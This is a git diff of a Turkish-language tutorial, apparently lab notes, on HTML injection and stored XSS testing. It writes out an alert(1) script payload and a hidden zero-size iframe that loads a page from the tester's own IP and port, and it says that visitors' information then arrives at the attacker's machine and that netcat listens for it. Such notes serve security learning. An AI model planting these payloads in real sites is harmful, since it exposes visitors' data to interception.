@@ -2,7 +2,7 @@ SQL İNJECTİON - REFLECTED (GET)
 
 ![photo_6023604428080265317](https://user-images.githubusercontent.com/110966683/183882924-70f82c7d-2eda-466c-9db7-4680c145040d.jpeg)
 
-bu panelde html açığı olup olmadığını anlamak için panele html kodu yazıyoruz ben örnek olarak <h1>sait</h1> yazıyorum.
+bu panelde html açığı olup olmadığını anlamak için panele html kodu yazıyoruz ben örnek olarak "<h1>sait</h1>" yazıyorum.
 
 ![photo_6025856227893950465_w](https://user-images.githubusercontent.com/110966683/183883997-b8cb1b5b-2198-4612-ac88-f445d160f5e6.jpeg)
 
@@ -20,6 +20,7 @@ eğer bir stored açığı olursa burda çalıştırdığımız bir kod web site
 alert scripti: <h1>Hello,<script>alert(1)</script>!</h1>
 peki daha teklikeli olarak ne yapılabilir;
 <iframe src="http://192.168.245.148:4545/test" height="0"  width="0"></iframe>
+kendi bilgisayarımızın ip sini ve kullanılmayan bir portadresi yazıyoruz 
 
 bu komut sayesinde siteye giren kullanıcıların bilgileri bilgisayarımıza gelir
 dinlemek için linux terminalimizde natcat kullanacağız 
